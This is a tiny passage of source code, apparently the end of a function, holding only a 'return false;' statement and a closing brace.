    return false;
}